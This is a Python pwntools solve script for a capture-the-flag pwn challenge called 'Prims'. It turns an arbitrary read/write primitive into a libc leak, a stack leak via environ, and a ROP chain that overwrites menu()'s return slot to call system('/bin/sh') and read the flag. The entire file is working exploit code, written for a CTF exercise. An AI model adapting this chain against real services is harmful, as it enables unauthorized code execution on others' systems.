#!/usr/bin/env python3
"""CYBERBLITZ 2026 "Prims" — arbitrary read/write -> ret2libc.

  leak libc   : arbread puts@GOT
  leak stack  : arbread libc environ
  find target : scan down from environ for menu()'s saved return value (0x401344)
  overwrite   : lay [pop_rdi, binsh, ret, system] over it -- return slot written LAST,
                because main's `while(1) menu();` rewrites it on every iteration.

Local test needs the provided loader/libc:
    patchelf --set-interpreter ./ld-linux-x86-64.so.2 --set-rpath . main

Usage:
    python3 prims_solve.py                      # local ./main_patched
    python3 prims_solve.py remote <host> <port>
"""
import sys
from pwn import ELF, process, remote, p64, context, log

context.arch = "amd64"
context.log_level = "error"

libc = ELF("libc.so.6", checksec=False)
GOT_PUTS = 0x404000          # No PIE
MAIN_RET = 0x401344          # instruction after `call menu` in main
POP_RDI = 0x10C08D           # libc offsets (glibc 2.39, provided copy)
RET = 0x28A92


def start():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return remote(sys.argv[2], int(sys.argv[3]))
    return process("./main_patched")


def rd(p, addr):
    """arbread: prints 8 bytes in MEMORY order -> parse little-endian."""
    p.sendlineafter(b"option > ", b"1")
    p.sendafter(b"address > ", p64(addr))
    p.recvuntil(b"arbread: ")
    return int.from_bytes(bytes.fromhex(p.recv(16).decode()), "little")


def wr(p, addr, val):
    p.sendlineafter(b"option > ", b"2")
    p.sendafter(b"address > ", p64(addr))
    p.sendafter(b"write > ", p64(val))


def main():
    p = start()

    base = rd(p, GOT_PUTS) - libc.symbols["puts"]
    assert base & 0xFFF == 0, f"bad libc base {base:#x} (byte-order bug?)"
    log.warning("libc base %#x", base)

    env = rd(p, base + libc.symbols["environ"])
    log.warning("environ (stack) %#x", env)

    ret_slot = None
    for off in range(0, 0x900, 8):
        if rd(p, env - off) == MAIN_RET:
            ret_slot = env - off
            break
    assert ret_slot, "menu() return slot not found"
    log.warning("menu ret slot %#x (delta %#x)", ret_slot, env - ret_slot)

    binsh = base + next(libc.search(b"/bin/sh\x00"))
    chain = [base + POP_RDI, binsh, base + RET, base + libc.symbols["system"]]

    for i in (1, 2, 3):            # stable slots in main's frame
        wr(p, ret_slot + 8 * i, chain[i])
    wr(p, ret_slot, chain[0])      # LAST: consumed the moment menu() returns

    p.sendline(b"")
    p.sendline(b"id; cat flag* /flag* 2>/dev/null")
    p.interactive()


if __name__ == "__main__":
    main()
